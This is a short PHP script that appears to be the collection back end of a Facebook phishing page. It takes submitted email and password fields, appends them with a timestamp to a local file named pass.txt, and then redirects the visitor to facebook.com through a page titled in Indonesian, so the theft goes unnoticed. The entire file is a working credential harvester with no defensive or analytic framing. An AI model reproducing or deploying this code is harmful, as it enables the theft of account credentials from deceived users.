<?php
$file = "pass.txt";
$username = $_POST['email'];
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "Username: ");
fwrite($handle, "$username , ");
fwrite($handle, "Password: ");
fwrite($handle, "$password , ");
fwrite($handle, "$today");
fwrite($handle, "#=#=#=#");
echo '<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.2//EN" "http://www.openmobilealliance.org/tech/DTD/xhtml-mobile12.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
<title>Mengalihkan halaman</title>
<meta http-equiv="Refresh" content="1; URL=http://facebook.com/home.php?"/>
</head><body>
</body>
</html>
';
?>
